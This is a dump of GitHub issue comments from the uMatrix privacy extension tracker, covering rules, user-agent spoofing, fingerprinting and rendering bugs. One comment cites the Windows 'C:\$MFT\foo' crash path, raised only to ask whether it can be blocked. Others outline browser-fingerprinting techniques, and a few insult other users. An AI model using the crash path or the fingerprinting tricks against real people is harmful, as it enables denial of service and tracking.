extension yourself.\nWhat would be the point of logging countless requests from unknown tabs? You could argue that this should be already a feature (knowing which tab the HTTP requests originated from) but this would affect the memory footprint and wasting programmer time on extremely niche features that only a very small subset of the user base would enable doesn't seem like smart use of it.\nI digress, what I really wanted to say is that even if you set the maximum logged requests to 999, that would still only account for about 20 websites worth of requests (unless you go to really bloated news sites, in which case, about 5), and would OBVIOUSLY know when you visited them. If you don't, do not fret, uMatrix clears the statistics table(?) anyway, as soon as you close the browser.\n. @gorhill I think he's talking about the ability to pick a specific UA string on a per site basis (i,e, FF32 for github, Chromium 41 for youtube, and so on).\n. \n. Is this still a thing? I thought it just fetched resources from the project's page upon launch.\n. Is this still a thing on the FF version? Can't find any information about this.\n. It's not better, it's less modular. As long as the filter lists don't overlap, it's fine.\nuMatrix's learning curve is unreasonable for the average tech illiterate person.\n. Oh gosh, not this crap again.\n. But why? What potential use case could there be for something like that?\n. Oh! I naively figured I would have no problems as I imported the same profile I use on Chromium. My bad!\n. Agreed. \nWhich reminds me, you once said you were waiting for Chromium dev support websockets, in order to make them interceptable via chrome.webRequest.onBeforeRequest. Are you going to add websocket support to firefox?\nAnyway, a good solution to the b-t-s requests problem, would be to bring it to the front UI, like so \n\nI suppose a per-tab B-T-S scope would be rather hard to do.\nEdit: A per tab network logger (like uBlock's) would be great too.\n. Found a problem with the b-t-s matrix layout -- it doesn't resize itself (when the settings page is open).\n\nConversely, when you're using the request logger, it does resize itself properly, but doesn't have a scrollbar.\n. > I've seen in the past remove/disabled extension being kept alive somewhere in Firefox, and with memory footprint increasing. Given that in development reloading the extension happens quite often, the remove/quit/launch/install steps have given me the best result so far.\nCould be it. I'm going to do that and try to replicate it.\n. I'm doing the same. I've done what you said, in regards to addon installation and so far so good.\nUpdate: memory has remained more or less constant throughout the day, meaning your method for updating the extension worked.\n. Been monitoring usage for the past 3 days and you're right. Glad to know it supports e10s out of the box too (I don't think policeman does, for instance, so it's definitely good to know).\n. uMatrix rotates the user agents internally, even if the preference isn't set, but, if the latter is true, it won't override yours, so it's all good.\n. For the entry in the logger? Just \"rotating user agent, current string: {{string}}\". Perhaps with a little tooltip next to the UA spoofer which states they are rotated constantly, but the browser's UA will only be overridden if the box has been checked.\n. Has happened to me after reinstalling Chromium. Deleting the \"application\" folder and installing it again might fix it, it did for me, assuming this problem started as soon as you updated chromium.\n. FF 40 (aurora) here, cannot replicate this issue.\nDisabled security.mixed_content.block_display_content in about:config, and toggled the mixed content switch off: 31 requests (25 https requests, 6 images fetched from http sources); turned it back on: 25 https requests.\n. @Dupond you can disable flash based font enumeration in the mms.cfg file, by adding DisableDeviceFontEnumeration = 1.\n. It's only a problem if you're using the search as you type feature, which you can (and should) disable on google's settings.\n. @gorhill Can confirm. Wasn't working with uMatrix on (in default deny mode), disabled it and it worked. Chart opened in another tab. At no point did the logger report anything being blocked.\n. > How do I get my add-ons signed if they are hosted on AMO?\n\nNo action is required. We will automatically sign the latest reviewed versions of all add-ons currently hosted on AMO. You'll receive an email notification when this has been completed, and users will see that the add-on was updated. After the signature system goes live, all new versions will be signed automatically after they pass review.\nHow do I get my add-ons signed if they are not hosted on AMO?\nYou will need to create an AMO account and submit your add-on. There will be an option where you indicate the add-on isn't hosted on AMO, and you'll be able to submit your add-on files without having them published on the site.\n\nMozilla's wiki.\n. You need to go to the behind-the-scenes matrix and whitelist \"other\".\nAlternatively, add behind-the-scene * other allow to the \"My rules\" panel. \nWhich reminds me: how come the b-t-s matrix warning has been removed?\n. I believe he's talking about copying strings directly from the matrix.\nDoesn't seem plausible though. Long hostnames would effectively render the cell useless.\n. You can update it yourself...\n. No, I didn't do it manually, I used the restore button (I take it that generates the same SQLite file).\nTo delete the SQLite file, I closed the browser, deleted it, and then reopened it. Then I restored the rules by going to the My rules tab and using the built-in restore feature, and manually configuring ~~the privacy features~~ everything else to make it the same as before.\n. No, I restored my uMatrix rules before trying it again. I suppose that rules it out (b-t-s 'other' is whitelisted).\nDoesn't uBlock come bundled with it though? Or does it fetch each list on demand before caching them?\nOh my god, it was actually a XHR that blocked it. Just kill me for wasting time.\n. You are right, it was a b-t-s request that I had overlooked. It appeared as an XHR request and I mistakenly thought it was going to be categorized as 'other' (haven't whitelisted list maintainers in a while).\nNonetheless, shouldn't it throw a warning that the filter list wasn't successfully downloaded?\n. Opening a previous session on Firefox will always set the scope to blank.about-scheme for all (non-cached, which are all of them) tabs until a refresh occurs (new tabs behave normally). \nIt looks very similar to this problem.\n\nMy custom about:config settings can be found here.\n. Yes.\n\n. Yup, it worked.\n. @stryx I think css and fonts are lumped together due to space restrictions, hence this request.\nIt would also justify the existence of the my rules pane, as it would actually extend the functionality of the matrix.\n. No idea about KB SLL enforcer, but https everywhere cannot be replaced by uMatrix since they are inherently different. uMatrix only blocks (assuming you've toggled that option on) mixed content, whereas https everywhere attempts to rewrite requests to these sites to https (eg: rewrite other people's links so that they are https, instead of http).\n. Redacted: Misunderstood issue.\n. Duplicate of https://github.com/gorhill/uMatrix/issues/262\n. @Alpengreis Doesn't matter, it's the same bug, happened to me as well (last post there).\n. I don't think uMatrix's rule syntax supports regex, but this sounded so good.\n. You can already do that on FF.\nuser_pref(\"plugins.enumerable_names\", \"\");\n. All about:* URLs are a part of blank.about-scheme. As for uBlock's dashboard, it's a background page, so it makes sense. If you want to look at the b-t-s requests, you're going to have to open it in its own dashboard.\nEdit: was trying to replicate it (successfully, which is the expected behaviour) and found an actual bug.\nSteps to reproduce:\n1. Go to ANY page https://github.com/\n2. Go to about:about\n3. Check the matrix\nWhat happens: uMatrix is still stuck on github's page\nExpected behaviour: blank.about-scheme\nWorks for some other about: pages as well, like about:cache.\n. Weird. Firefox is due a reinstall anyway. Joke's on me for using Aurora.\nI tried to create this scenario to see what the matrix UI would look like.\n. Ah, that clears it up then.\n. When you go to an http site you are less secure by default if you're using an untrusted connection, regardless of where you load your scripts from. The attacker can inject iFrames, scripts, and so on so forth, into your page.\nhttps://github.com/mitmproxy/mitmproxy\nSure, it's technically 'less unsafe' to load assets from https pages since they're harder to tamper with, but still.\n. @ImSpecial Buzzwords.\nClickjacking = Blocking third party frames\nAs far as XSS is concerned, there are a myriad of techniques for it, most of which rely on scripts, frames and browser exploits (one could in theory execute JavaScript via HTML IMG tags, but browsers no longer allow that to happen).\nThe only thing NoScript has on uMatrix (which does not make up for its deficiencies and lower performance) is the feature referred to as 'surrogate scripts'. Essentially mirroring a library, or a modified version of a given library (e.g. mootools, or jquery). uBlock used to have this.\n. @ImSpecial gorhill posted them recently, regarding CPOWS. You can more or less compare cpu usage whilst loading the same page and observing the memory and cpu delta.\nThat feature is hardly useful. Looks like bloat to me.\n. Check the behind-the-scenes matrix. It works for me, so.\nbehind-the-scene pushbullet.com * allow\npushbullet.com 1st-party xhr allow\npushbullet.com google.com cookie allow\npushbullet.com pushbullet.com cookie allow\npushbullet.com pushbullet.com other allow\npushbullet.com track.pushbullet.com xhr allow\npushbullet.com www.pushbullet.com other allow\npushbullet.com www.pushbullet.com script allow\n. No. There's https everywhere for that.\n. uMatrix's job is not to rewrite URLs for websites that support https.\n. It means he disagrees and, to be fair, so do I. It's too subjective and doesn't make a difference. Locks > disquettes.. https://en.wikipedia.org/wiki/WYCIWYG\nYes\n. Looks like a problem on your end. Go to %appdata%\\Local\\Google (if I'm not mistaken), and delete the application folder. Then install it again.\nI don't have Windows installed anymore, but I can confirm it's working normally for me (Chromium 45.0.2454.85 / Gentoo).\n. @gorhill Sometimes it's the browser's installation. Updating without deleting the 'application' folder would occasionally break my installation, namely the font rendering of some UI elements as well as the rendering of the matrix itself (it would be completely blank).\nIf you didn't push a uMatrix update to the chrome store, then the browser update is the only differing factor.\n. If you're using firefox, go to about:config and set intl.accept_languages to en-us,en, and the general.useragent.locale to en-us. It's the most common HTTP ACCEPT header.\n. Must be a windows issue. Gentoo here, FF 40.0.0.3, tried with both flash and html5, referrer spoofing on, and it just works\u2122.\n. Why don't you ( @Symbai @danieljl ) post the logger output?\n. Just to clarify: the 'delete blocked cookies' option makes it so that blacklisted cookies are immediately deleted upon entering the browser and being accounted by uMatrix. Right?\n. IIRC gorhill only accepts translations directly from crowdin.\n. You can use uBlock Origin in the meantime.\n. Did you try the latest version from github? It does have basic thunderbird support https://github.com/gorhill/uBlock/commit/7501447cace6832ee8b8423689ac989cc914bcdc\n. Wait, so this was caused by a firefox update? I don't remember having this issue before\n. You can already import and export rules, but I see what you mean.\n. An easy way to interpret the matrix is to view everything as an aggregate of transparent, hierarchical layers that inherit properties from the top down \u2014 everything you do to the global scope is inherited by the local scope without overwriting existing local rules. Conversely, what you do to the local rules does not affect the global scope because it's a narrower scope, at the bottom of the hierarchy.\n. This is hardly a uMatrix bug.\n. > By the way, I don't know how to get served Flash for Youtube\nIf you're on firefox and haven't enabled/disabled the relevant about:config settings, it won't support a few codecs out of the box, and will give you the option to use flash player by default here.\n. Close this, it has already been requested before and the response was negative\u2014rightfully so.\nRedacted for correction! My bad.\n. * translate.googleapis.com * allow probably\n. I'm pretty sure he wants to sandbox cookies (similar to how priv8 does it). From what I gathered his case is that if you allow google cookies on google.com, and then you allow google cookies on github.com, google will have access to 'both' of them.\n. This existed before and was called 'Recipes'. Gorhill removed it. I liked that feature, but I trust that it was removed for a reason.\n. Stop being a fucking nuisance.\n. https://github.com/gorhill/uMatrix/wiki\nAlso, reported.\n. Gorhill should have just blocked you from accessing the bug tracker.\n. Gorhill is asking if you tried to fix it using the scopes/toggles. What rules did you use?\n. uBlock used to have a similar functionality, except I believe it cached CDNs on the fly. It was called 'local mirroring' and was ultimately disabled because it broke some sites. Never had a problem with it, personally.\nGorhill said he had plans to make a separate extension with the functionality, but he's either dropped them or hasn't gotten around to it yet.\n. You can do this with uBlock. Disable a specific url, in this case, ending in .js, on a given hostname.\n. Duplicate of https://github.com/gorhill/uMatrix/issues/574 as well as others.\n\nYou can do this with uBlock. Disable a specific url, in this case, ending in .js, on a given hostname.\n. https://github.com/gorhill/uMatrix/issues/263 seems like a better alternative and actually justifies the existence of the My Rules panel.\n. Disagree. Greyed out implies it cannot be used. It goes against consistency.\n. He liked a similar idea: https://github.com/gorhill/uMatrix/issues/108.. Yesterday I made the switch to chromium (58) and noticed occasionally the popup UI would look normal and be responsive at first, but clicking on a cell would not work until I refreshed the page. I wonder if it's related. Unfortunately, I did not open the console and this does not happen reliably. . @Gridlocked yeah, sometimes it turns white.. ... maybe it's because web extensions is a firefox API... for firefox?. \n",
    "ldgbc": "For references, RequestPolicyContinue support redirect blocking.\n. It seem uMatrix does support redirect control now but it require using Filter list rather than \"on-the-fly\" method. \nFor reference, @polyzen mention RefControl: Note that RefControl just allow you to modify URL header (which URL you click on to open this page) and is not relate to this issue.\n. Can the \"date' of it been last updated be add? It would give detail on how outdated, is \"outdated\".\n. This is also useful for situation such as \navatars1.githubusercontent.com\navatars2.githubusercontent.com\nThere isn't a way for you to quickly do \n*.githubusercontent.com\n. No.\nuBlock can use \"picture / image / CSS / layout\" or \"URL / link\" filters to block everything you want.\nUMatrix use \"host / domain / website / URL (1st level)\" to block thing. \nFor example: You can make uMatrix block \"https://github.com\" but you can't make it block just this page: https://github.com/gorhill/uMatrix/issues/443\n. Isn't it doing all that already?\nThe allow-session is controlled via the option, \"Delete non-blocked session cookies (x) minutes after the last time they have been used.\" Unless you want another 3rd option in the uMatrix table that allow all 3 setting rather than the current 2.\nClicking on the \"?\" in the setting explain it in more depth.\n. ",
    "WoLpH": "Is there any progress on this? It's quite annoying that I have to create a new rule for these sites and/or disable uMatrix completely for these urls to work. I don't want to enable these sites forever, but when they're the 1st party/redirect host, they should get whitelisted or even better, an \"allow once\" button.\nTo test, just try any of the product links on this site: https://www.1dagskoopjes.nl/\nThey all result in the following for me:\n```\nThis webpage is not available\nERR_ADDRESS_UNREACHABLE\n```\n. From my experience the Chromium dev team tends to take many years to fix issues, if at all.\nWould it be an option to give the popup a larger size by default and when actually filling it, scale down if needed. That way the worst thing that could happen is that the popup is larger than needed on OS X. Perhaps a min-width or something in the <body> style of popup.html could do the trick?\n. It should be noted that uMatrix is the only extension that exhibits this behaviour. I have about 10-15 extensions with popups and I've never had these problems before. So it must be related to how the popup content is formed.\n. For the time being I'll just run my own version of uMatrix with a fixed height/width. I'm not sure if there's a good workaround available, setting the min-height/max-height and/or min-width/max-width has no effect but setting the height and width to a fixed value works just fine for me.\nObviously... some people have smaller screens so it's not a universal solution.\n. It's most likely a timing issue. I think it measures the size from the content at a certain point in time and because the data is added later it might not always work correctly.\nThat would also explain why it works sometimes and is broken at other times, the big question is how we can force a resize/redraw without breaking other stuff. I'll test a bit\n. Ok, I may have found a fix (at least, it appears to be working correctly so far). By adding a clearing div at the bottom of the popup.html file it appears to be working.\nSo somewhere below the content just add this:\n<div style=\"clear: both;\">&nbsp;</div>\nI'll keep testing and create a pull request if it's a permanent fix.\n. I've tested both Chrome and Firefox and see no adverse effects but I'm not a 100% sure about the rest.\nHaving that said, clear divs are a common solution for design problems in websites so I think it's quite a low risk change. Worst case I can think of if some browsers perhaps ignore the height setting and add blank space at the bottom of the popup.\n. Yes, it appears to have worked for a little while but chrome broke it again. The last few chrome versions actually gave me weird rendering bugs all over the place so I'm simply not using it much anymore. . Thanks for the quick response :)\nAlso, great work on the extension... beats everything I've tried so far by a long shot\n. ",
    "polyzen": "@WoLpH, RefControl does the job well. Will have to take a look at RequestPolicyContinued..\nEdit: Woops. Totally different purpose ;p\n. It would be very appreciated if there could be an option to choose whether the entire bar is clickable. The amount of times I've accidentally clicked the bar instead of the reload button is \"too damn high\" :p\nShould I open a separate issue to see if someone is interested in implementing this?\n. Perhaps a bigger gap between the buttons and the bar, then?\n. ",
    "RyanTG": "I just switched from RequestPolicy Continued, and I'm missing the ability to allow/block redirects. I'd love to see that added to uMatrix. Otherwise, uMatrix is great! The UI is well done. Thanks, folks.\n. ",
    "Thorin-Oakenpants": "For those missing the ability to allow/block redirects, until/if this feature is added to uMatrix, I recommend NoRedirect ( https://addons.mozilla.org/en-US/firefox/addon/noredirect/ ). It's pretty straightforward. It applies rules from the top down. And you can use Regex if you want. From Options in Add-ons panel, add .* as \"Source\" as your bottom rule (this is a default deny), then add domains above it as \"Allow\" eg I have *arstechnica.com* and other news sites that redirect from an rss feeds in my RSS newsreader.\n. +1 for removing the UA spoofing\nFor starters, you block 95% of it (FP'ing) by blocking the offending JS (usually 3rd party - as pointed out by gorhill). UA is a really* small part of overall FP'ing, and 6+** years after Panopticlick brought it to people's attention, and dozens/hundreds of tickets on bugzilla, and even AFTER Tor Uplift's patches, it is STILL leaking like a sieve. date/time leaks locale and language, UA leaks over HTTP CONNECT method ... I could list more.\nFYI, they are probably going to not lie about the OS (or rather limit it to four - Windows, Mac, Android, Linux) due to so much general breakage, and they already don't spoof as non-FF. And yet it is trivial to do feature detection (for browser make and even model), or even use a CSS line height query to get your OS, or check scrollbar thickness for the same info.\nRemove the UA spoof feature - it is giving end-users a false sense of security IMO\n/end of 2 cents. > Not every site uses international espionage grade analytics to track users\nI wouldn't call a few lines of code (eg for CSS line height) international espionage grade analytics. The number of sites grabbing metrics is huge, and growing. Thankfully its almost always 3rd party. This is nothing to do with state actors - for that go and use Tor over VPN on Tails or whatever.\n\nMuch like a lot of threads lately, the position you're taking is akin to forgoing SSL entirely because it's broken by design.\n\nNo-one said to stop trying to defeat FP'ing where it is unavoidable. There are dedicated extensions for UA (arguably most are not very good), and there is privacy.resistFingerprinting.\nThe point was that I think UA spoofing in uM is very bare bones, incomplete, almost impossible to get right, a waste of gorhill's time, and gives users a false sense of \"privacy\"\nI have no idea what bugs being invalidated, net neutrality and all those corporation names have to do with this.. There are too many \"leaks\" that can give away your language: such as locale/time-zone (eg NZST = New Zealand Standard Time = probably English), date/currency formats (eg saturday vs samedi (french) vs sabato (italian) etc), keyboard hardware fingerprints and events, font enumeration - to name but a few. I haven't confirmed it, but I suspect that even the gecko.buildID (which reveals the build date and time down to the second) could be used to determine if the build/bundle used is English, German, French etc.\nHopefully, the Tor Uplift Project will incorporate time-zone/locale/language spoofing in the future, as they have done with screen/window metrics. It's not something that can be comprehensively handled by some preferences - the rabbit hole goes too deep.\nhttps://wiki.mozilla.org/Security/Tor_Uplift/Tracking\n. I think I know what  electricessence is getting at, and I'm all for it as well.\nFor explanation, I use Cookie Controller ( https://addons.mozilla.org/en-US/firefox/addon/cookie-controller/ ) which allows much more control over cookie settings per domain. IN FF options, by default I block all cookies. Then under a domain I can\n- allow\n- allow as 1st party only\n- allow for session only (do not confuse this with a self-destruction or timer destruction)\n- deny\nIf this sort of control could be added into uMatrix, that would be great. Not sure how you would handle it, since the matrix cells are basically on/off, red/green - maybe the cookie column could be four-state.\nUnless I'm missing something here, there is no way to allow a domain via uMatrix to allow a session cookie - its either allow or block.\n. No problems. Mark as closed/resolved/wontfix :)\n. @berrythesoftwarecodeprogrammar Indeed. I use UAControl with User Agent Overrider (I haven't looked for a while, and there are bound to be dozens them) - would be nice if one addon did both headers and JS (there probably is one, I'm just being lazy today - and no, I do not want RAS).\n. @berrythesoftwarecodeprogrammar Excellent. Thanks. Works as advertised :) One less thing to maintain and worry about.\n. @crssi The thread is about alerting gorhill that the two methods of getting the user agent (headers, JS) were not both covered by uMatrix. With JS fixer, this issue is no longer an issue.\nThe fact that the user agent contains OS info, means that as an end user, you need to be smarter with your OpSec. That has nothing to do with uMatrix. The same goes with trying to spoof, for example, your time zone - you need to make sure locale, date/currency formats, languages and a dozen more items are all plausible, otherwise all you do is create a unique fingerprint. This is because there are a huge amount of ways to get information about your browser etc, including redundancies. Here's one that definitively determines you are using FF ( https://thehackerblog.com/dirty-browser-enumeration-tricks-using-chrome-and-about-to-detect-firefox-plugins/index.html ). How about navigator.buildID which reveals the built time of your version down to the second. And there are ways to determine exact or rough estimates of your browser make and model based on internal changes and responses.\nTBB struggles to get all this right. An unpatched FF has no hope. Your best defense of course is to control JS. Worse case scenarios, you need to be plausible, and follow good OpSec. Don;t pretend to be chrome or safari when you are not. Don't pretend to be linux when you aren't. Surely 64bit FF on Win8 is a pretty common subset. Stick to that as your options, just change the version numbers.\n. @crssi JS Fixer works perfectly as described. It matches the header to JS. End of story. That is it's purpose. It is not broken.\nGorhill has said he not going to do this (i.e match JS to headers, which is what this issue was about). And now that we are aware of this, regardless of the extension we use to spoof, we can at least marry the two with JS Fixer if need be. The issue is closed. The topic is \"... methods of getting the user agent\".\nThe topic is NOT \"how to make all the fingerprinting and information leaks in your browser match random user strings\". You're twisting it all on its head. What I am trying to explain to you is that you are almost asking for the impossible. I haven't checked in on RAS for a while, but this is exactly the sort of thing they are trying to do. But you'll still fail to plug it all. There is no way you can hide your browser or operating system (and more) from the truly determined.\nI already gave you a couple of examples that cannot be blocked (assuming you have to allow the JS) that determine your browser as being Firefox. There are even more ways to work this out. There are multiple ways to determine your OS. Forget about all those about:config entries - that's just the tip of the iceberg. For example, even if you block flash and disable downloaded fonts, and don't allow web pages to choose their own fonts etc - JS can still determine some (or even all?) of the fonts on your system, and from that, work out your OS.\nYou will never defeat fingerprinting (assuming you have to allow JS to run). There are just way too many holes, and if they were all plugged, the internet would mostly break for you. The best you can do is limit it (by reduce entropy (being very common), or even by raising it by randomzing everything all the time (always being unique)). If the choice is to reduce entropy, they you need to use good OpSec.\nIf you want to ask gorhill to patch/cover all the methods of getting the information displayed in user agents, then politely ask him in a new issue and read his response :)\n. @berrythesoftwarecodeprogrammar \"prefs.js is where all about:config entries are stored\".\nNot exactly. It's where \"user set\" values from about:config are stored. These can be entries you edited in about:config and changed from default, or any prefs from user.js (the values can be default or not default) which are written to the prefs.js from user.js on a Firefox start. Anything in prefs.js is shown as \"user set\". It is also where extension preferences are stored. Prefs.js is definitely not all about:config entries - those are hardcoded or stored elsewhere; this is how a FF update can change pref default values, remove prefs, and add new prefs - all without messing with your prefs.js, which is in your profile. It's a profile file, not a application file.\ntl;dr:\n1. Preferences changed from default in about:config are written to prefs.js in real time\n2. When Firefox starts, user.js preferences (default or not) are written to prefs.js\n3. Then all prefs.js preferences are marked as \"user_set\" and their values overwritten in about:config for display and use\n4. Topic for another day, locked prefs\n. What does file-scheme file-scheme script block do?\n. @gorhill : quick question (semi related i think, please don't shoot me). See ghacks-user.js issue, Bugzilla 1368682 etc. No one is sure yet if this is a problem in web content, but it certainly can be done manually eg entering C:\\$MFT\\foo - anyway to block this in uM or uBo?\nEdit: https://www.bleepingcomputer.com/news/microsoft/filesystem-bug-hangs-or-crashes-windows-7-and-windows-8-1/\n^^ probably explains it nicely. No one is sure if this bit \"or the path is secretly loaded in the background of a web page, as an image's source URL\" can be accomplished, see bugzilla, ghacks issue comments\n. FWIW, I do not believe this is a uMatrix issue. I use (in Firefox) UAControl to spoof headers and User-Agent JS-Fixer so JS matches. I get the same result as you.\nwindow says FF 45, iframe says FF 49 .. maybe someone can dig a little deeper. crssi, what browser are you using?\n. @crssi I just spoof to the latest FF ESR. It's pointless trying to hide your browser model. Now I'm thinking its pointless trying to hide the browser version.\nhttps://www.torproject.org/projects/torbrowser/design/index.html.en#fingerprinting-linkability\n^ scroll down to \"Strategies for Defense: Randomization versus Uniformity\"\n. @acrobat1 yes, JS needs to run to return the UA string. Obviously, these are worst case scenarios - the best defense is to block as much (or all) unnecessary JS (and other leaks such as css, etc), which is what uMatrix and uBlock Origin are all about.\nhttps://github.com/pyllyukko/user.js/issues/193#issuecomment-259157324\nIf the UA string was that important a metric in fingerprinting (and it can be fairly high entropy), then it wouldn't be hard to use 1st party scripts that are based on feature detect. Just my 2 cents on it :)\n. FYI: I suspect the issue is to similar to this (exact same symptoms): Resource URI Leak add-on setting causes Firefox 53 login/password problems ... \n\"No Resource URI Leak\" FF add-on, options->\"Block Web-exposed subset of chrome:// URIs\" (and it has a warning) and is disabled by default.\nSo something to do with chrome:// blocking in the OP's ruleset (this does not happen with uMatrix defaults)\nNote: Edited to clarify. Sorry, I didn't mean to imply uMatrix or uBo were leaking resources, or that they were at fault. My message was meant for OP as a possible solution/clue - the link describes the exact same symptoms and it was traced back to \"a subset of chrome://URIs\", whatever that may actually be.. No worries - edited my first post to clarify in case someone doesn't read on :). I'm sure you are aware, that privacy.resistFingerprinting, as part of the Tor Uplift Project, will (hopefully) spoof UA (more thoroughly). That ticket, will also hopefully close a few navigator and other holes. This is to lower entropy, and will only work in large numbers (and FF's base with that pref can do that) - the idea is to spoof as the latest ESR as per TBB does (i.e not claiming to be chrome or something silly).\nRef:\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=1333651\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=1333933\nI wholeheartedly endorse that you drop the whole UA part for all the reasons you said. An earlier issue I raised (2 years ago?) was that JS did not match headers (fixed at the time by using UA JS Fixer or something add-on). Another issue raised by someone else was the real navigator values being leaked over iframes. The list goes on. There are so many \"holes\" and methods that add bits and raise entropy. I fully agree that this is left to a specialized extension and/or the Tor Uplift.\nJust my 2cents :). ... just wiped all my typing ... theDuckIsAlive just beat me to it .. except I would have used https://github.com/gorhill/uMatrix/wiki/The-popup-panel#scope-selector as the link xD. > I don't know what is \"CTRL+SHIFT+DEL interface\".\ngorhill, in FF that is the \"Clear All/Recent History\" dialog which allows removal of various items such as cookies, various histories, Offline Website Data etc .. it is this item I bold'ed that causes the issue\n\nuBo issue may be related\nApologies if this is the wrong place to bring this up, but it seems relevant to a weird issue - I think this is the same issue that @grauenwolfe was experiencing (Mac, FF57, latest uBo stable a week or so ago) where the collapsed state of the 3rd party lists in the dashboard becomes stuck - see https://github.com/ghacksuserjs/ghacks-user.js/issues/273#issuecomment-346779584 (or I will summarize below)\nDashboard set like this (collapsed)\n\nClear Offline Website Data via various methods such as Clear All History and collapsible state is reset\nThe problem is that the setting is no longer and can cause a collapsed state to stick\n\nFor example, if I collapse a filter group it will stay collapsed indefinitely until OWD is cleared\n\nCould this setting's storage location be moved? Or is this a non event and nothing needs to be done? I couldn't replicate on Windows.\n. The 15 is a placeholder, you can enter a lower value AFAIK. I assume the same for the cookies.\n\n. @gorhill What is the title for the bug? I assume the content for the bug will be everything after Here are the steps:? i.e if no one else will post the bug then I will. @Cerberus-tm .. If you've already reported it, no problems, and yes please, tell us the bugzilla number (triage will fix any issues with categorizing the bug) - also add a link to this issue in the bug if you can for reference. The title can always be amended if its not descriptive enough :)\n. Here is my * scope settings - note the far left first party is green\n\nNow every site will load 1st party css + images only as per the sections I boxed in black. The green cells outside the black boxes are extra rules I created\n\nNote: this works for me since I block everything else (top row all) and still alows me to control JS, cookies, frames etc even on 1st party\nHere are a couple of examples of sites with no other changes\n\n. > That's a nice workaround ...\nIts not a workaround, it's working exactly as it is meant to. FYI: see https://github.com/ghacksuserjs/ghacks-user.js/wiki/4.2.3-uMatrix .. namely IPv6 and 192.168. > How are the new ruleset definitions are delivered to the addon\nDashboard>Assets> check the ruleset recipes, it's stored locally and updated like other assets. I'd even go slightly further. The puzzle-piece is optional and doesn't always show, so you don't want the items to the right sliding left (muscle memory etc). Or maybe that's just me and some weird sense of strict order kicking in\n\nAbove left group is all scope setting, the right hand group of three tie in with the global revert, but maybe you want a gap, maybe a centered middle div. Or maybe the group of three belong to the left since they are for the current scope\nif any that makes sense, food for thought, that's all\n. ",
    "AtTheGates": "There is also the extension Redirect Control (https://addons.mozilla.org/firefox/addon/redirect-control), which is very similar to the redirect feature in RequestPolicy (Continued). It works very good in combination with uMatrix for me.\n. ",
    "puff-m-d": "Hello gorhill,\nThanks for the response. I understand now. I have the two conditions as you posted above (also when using HTTPSB) but was just confused as to why HTTPSB reported them blocked and \u00b5Matrix does not. I suppose this is due to a difference in code between the two. Thanks again.\n. Hello gorhill,\nNow I fully understand. With HTTPSB, I had it set to \"block-all/allow-exceptionally\", which of course blocked 1st party cookies. I am using \u00b5Matrix in default mode which is allowing 1st party cookies. With both, I have selected \"Block third-party cookies and site data\" in Chrome's settings. Since I am now allowing 1st party cookies in \u00b5Matrix, I will not see any \"HTTP cookie headers\" being blocked. All due to the differences in how I have HTTPSB and \u00b5Matrix set up. Thanks for explaining this and helping me understand!\n. Hello gorhill,\nI do not like to make many suggestions but...\nI realize that the is only a very minor issue (more cosmetic than anything else), but I have several systems that I cannot use beta extensions on (can only use those from Chrome Store). It has been several months since this fix was implemented but it has never been published to the Chrome Store yet.\nDo you plan on publishing it anytime soon (maybe it has just been overlooked)?\nThanks for all the work you put into both uMatrix and uBlock.\nBest regards,\nKent\n. No problem at all...\nIt is already showing in the Chrome Store...\nThanks for all you do!\nBest regards,\nKent\n. Hello,\nAll good now, thanks for the quick reply and your work on uBlock and uMatrix!. ",
    "luxoflux": "Somehow I never noticed this in HTTPSB.\n. That settles it then... kind of a bummer. I was under the assumption this sort of thing falls under behind-the-scenes or extension-sheme requests, etc. But as you said, onBeforeRequest is not called.\nAnyway, to be clear, a remote connection is made (it's how instant results are served):\nHeaders\nRemote Address:173.194.65.139:443\nRequest URL:https://clients1.google.com/complete/search?client=stars&gs_rn=64&gs_ri=stars&cp=4&gs_id=h&q=test&xhr=t\nRequest Method:GET\nStatus Code:200 OK\nI could add clients1.google.com to my hosts file, but it might be needed for possibly important stuff, haven't looked in to it.\n. - With security.mixed_content.block_display_content set to true, insecure items are blocked: Blocked loading mixed display content ... in the console log.\n- When set to false and using only uMatrix to control it, I get Loading mixed (insecure) display content ... on a secure page.\nI'm on v38.0.1.\n. With uMatrix handling it:\n\nWith manual mixed display content block:\n\nAm I missing something here?\n. > Those warning do not seem reliable, it might be Firefox detecting the mixed content before uMatrix processes them. It's blocked all fine. [...] nowhere is there a matching GET\nThat's exactly what it is. I feel like an idiot now for not seeing that.\nAnd I just now saw this:\n\nWith uMatrix 0.9.0.0, unsecure network requests are blocked directly by uMatrix, rather than by the browser through a CSP directive. This means if a page is mixed content, your browser will notify you about the mixed content on that page, though the connections were blocked by uMatrix (use the logger to see for yourself).\n\nAlthough, I guess it can be a good thing to see the warning icon in the address bar, even if insecure items are blocked, so you know what the page is trying to load.\n. @CrisBRM Well that's handy, thanks for the tip.\n. So a few things of note:\n- Adding DisableDeviceFontEnumeration=1 to C:\\Windows\\SysWOW64\\Macromed\\Flash\\mms.cfg disables Flash enumeration.\n- Flash-based detection can only work if you allow scripts, and the Flash plugin (i.e., you should set click-to-play).\n- There's still another detection technique that uses CSS and doesn't require Flash, but will not work without javascript.\n- Personal opinion: using only document fonts ruins the user experience more than it's worth.\n. This appears to be related to how uMatrix/uBlock handles <noscript> tags (https://github.com/gorhill/uBlock/issues/308). The new Startpage sets #page-wrapper { visibility: visible } in <noscript> when javascript is disabled. If it isn't handled properly it remains set to visibility: hidden. I haven't tested what happens in Chrome, though.\nImmediate options are to use the Stylish extension and set #page-wrapper to always visible (more details if needed), or use https://classic.startpage.com.\n. I personally think the user should be alerted to \"meta redirections\" with temporary/permanent options to allow or deny\u2014that would take care of that problem. The other issues with <noscript> are up for discussion (@gorhill, maybe you could go over them here so we can all come up to speed?).\n. Technically, CSP directives should not affect bookmarklets, but in Firefox they do \u2013 see https://bugzilla.mozilla.org/show_bug.cgi?id=866522. I don't know if @gorhill could implement a workaround within uMatrix/uBlock, but this is a browser issue mainly.\n. @gorhill commented on Oct 25, 2015, 3:10 AM PDT:\n\nA similar issue was fixed with uBO (issue 248), but this one I could reproduce. Being able to reproduce the problem here is important as this would allow me to import the fix from uBO, and to confirm it works.\n\nThis was not fixed for uBO. I can still reproduce (1.3.6rc0).\n. Steps to reproduce have not changed. But I am now using https://jsfiddle.net/vu4fvn8w/embedded/result.\n. Well, I really can't think of why this very specific issue would affect only me. I can repro with a clean profile and fresh uBO install as well.\n. This issue has finally disappeared for me. I totally cleared my uBO profile and just imported my rules manually. I haven't been able to reproduce it since. Weird.\n. That had to have been it, because I 